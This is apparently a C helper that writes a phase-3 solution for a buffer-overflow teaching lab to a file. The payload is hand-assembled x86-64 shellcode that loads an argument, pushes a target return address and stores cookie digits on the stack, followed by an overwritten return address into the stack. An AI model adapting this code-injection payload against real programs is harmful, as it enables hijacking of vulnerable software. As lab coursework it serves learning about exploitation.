#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
int main()
{
	int fd = open("phase3.txt" , O_WRONLY | O_CREAT | O_APPEND);
	if(fd == -1){
		return 1;
	}
	const char p[] = {
/*78*/				  0xbf , 0x50 , 0xdc , 0x61 , 0x55 , 0x48 , 0x83 , 0xec,
/*80*/				  0x08 , 0x48 , 0xc7 , 0x04 , 0x24 , 0xfa , 0x18 , 0x40,
/*88*/				  0x00 , 0x48 , 0xc7 , 0x44 , 0x24 , 0xB0 , '5'  , '9' ,
				      'b'  , '9'  , 0x48 , 0xc7 , 0x44 , 0x24 , 0xB4 , '9' ,
					  '7'  ,  'f' , 'a'  , 0xc3 , 0x00 , 0x00 , 0x00 , 0x00};
	const char p1[] = {0x78 , 0xdc , 0x61 , 0x55, 0x00 , 0x00 , 0x00 , 0x00};
	//0x202bd6
	// 3 9 6 2 3 9 3 5

	//40 - 18 = 22
	char tmp[13];
	
	write(fd , (char *)p , 40);
//	write(fd , (char *)tmp , 6);
	write(fd , (char *)p1 , 8);
	
	close(fd);
	printf("len = %ld success\n" , sizeof(p));
	return 0;
}